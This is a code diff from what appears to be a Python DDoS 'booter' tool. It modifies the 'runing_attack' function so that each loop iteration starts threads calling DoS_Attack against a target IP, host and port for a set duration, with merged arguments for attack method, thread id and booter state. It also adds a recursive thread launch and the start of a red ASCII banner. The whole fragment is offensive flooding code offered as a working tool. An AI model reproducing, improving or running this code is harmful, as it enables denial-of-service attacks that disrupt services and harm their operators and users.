@@ -73,31 +73,18 @@ def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,boo
         while time.time() < time_loader:
             for _ in range(spam_loader):
                 id_loader += 1
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader))
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,id_loader))
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader))
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,id_loader))
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader))
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,id_loader))
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader))
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,id_loader))
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader))
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,id_loader))
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                 th.start()
     else:
-        th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader)).start()
-        th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,id_loader)).start()
-        th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,booter_sent)).start()
-
+        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
 #DATA
 banner = f"""
 {Fore.LIGHTRED_EX}▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
